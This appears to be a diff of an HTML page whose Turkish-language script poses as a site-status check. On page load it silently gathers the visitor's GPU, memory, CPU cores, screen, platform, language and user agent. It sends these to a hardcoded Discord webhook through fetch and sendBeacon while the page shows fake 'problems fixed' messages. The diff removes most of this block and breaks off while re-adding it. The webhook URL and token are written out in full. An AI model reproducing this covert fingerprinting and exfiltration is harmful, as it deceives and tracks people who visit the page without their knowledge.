@@ -12,7 +12,7 @@
             justify-content: center;
             height: 100vh;
             margin: 0;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: sans-serif;
             color: #eeeeee;
         }
         .container { text-align: center; }
@@ -26,12 +26,7 @@
             margin: 0 auto 25px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { 
-            font-weight: 400; 
-            font-size: 16px; 
-            letter-spacing: 0.5px;
-            transition: all 0.5s ease;
-        }
+        h2 { font-weight: 400; font-size: 16px; }
         .success-text { color: #00ff41; font-weight: bold; }
     </style>
 </head>
@@ -44,8 +39,8 @@
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        function teknikVerileriHazirla() {
-            let gpu = "Gizli";
+        function sistemVerileriniTopla() {
+            let gpu = "Bilinmiyor";
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
@@ -55,45 +50,5 @@
 
             return {
                 embeds: [{
-                    title: "🖥️ SİSTEM VE DONANIM RAPORU",
-                    color: 3066993,
-                    fields: [
-                        { name: "⚙️ DONANIM", value: `**GPU:** \`${gpu}\`\n**RAM:** ${navigator.deviceMemory || 'Bilinmiyor'} GB\n**İşlemci:** ${navigator.hardwareConcurrency || 'Bilinmiyor'} Çekirdek`, inline: false },
-                        { name: "📏 GÖRÜNTÜ", value: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`, inline: true },
-                        { name: "📱 SİSTEM", value: `**OS:** ${navigator.platform}\n**Dil:** ${navigator.language}`, inline: true },
-                        { name: "🕒 LOG", value: new Date().toLocaleString('tr-TR'), inline: false },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
-                    ]
-                }]
-            };
-        }
-
-        async function sistemiBaslat() {
-            const msg = document.getElementById('msg');
-            const loader = document.getElementById('loader');
-            const payload = teknikVerileriHazirla();
-
-            // Verileri arka planda sessizce gönder (Her şey bir öncekiyle aynı)
-            try {
-                await fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
-                navigator.sendBeacon(webhookURL, JSON.stringify(payload));
-            } catch (err) {}
-
-            // Arayüz Değişimi
-            setTimeout(() => {
-                loader.style.display = "none";
-                msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
-                
-                // 1.5 saniye daha bekle ve "Sorunlar düzeltildi" yazısına geç
-                setTimeout(() => {
-                    msg.innerHTML = '<span class="success-text">Sorunlar düzeltildi.</span>';
-                }, 1500);
-
-            }, 3000); 
-        }
-
-        window.onload = sistemiBaslat;
-    </script>
-</body>
-</html>
-
+                    title: "🖥️ SİSTEM ANALİZ RAPORU",
+                    
